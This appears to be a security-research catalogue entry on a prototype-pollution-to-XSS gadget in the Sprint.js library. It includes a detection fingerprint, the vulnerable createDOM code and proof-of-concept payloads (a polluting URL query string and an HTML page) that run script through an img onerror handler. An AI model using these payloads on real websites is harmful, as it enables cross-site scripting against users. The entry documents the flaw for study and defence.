## Sprint.js

URL: https://github.com/bendc/sprint

### JS Fingerprint
```
(typeof Sprint !== 'undefined')
```

### Vulnerable code fragment
https://github.com/bendc/sprint/blob/a220796dc6470cc928726a3f15192ca5389af36c/sprint.js#L58-L61
```js
  var createDOM = function(HTMLString) {
    var tmp = document.createElement("div")
    var tag = /[\w:-]+/.exec(HTMLString)[0]
    var inMap = wrapMap[tag]
    var validHTML = HTMLString.trim()
    if (inMap) {
      validHTML = inMap.intro + validHTML + inMap.outro
```

### PoC

```
?__proto__[div][intro]=<img%20src%20onerror%3dalert(1)>
```

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/sprint/0.9.2/sprint.min.js"></script>
<script>
	Object.prototype.div = {intro: "<img/src/onerror=alert(1)>"}
</script>
<script>
	$("<div id=x>")
</script>
```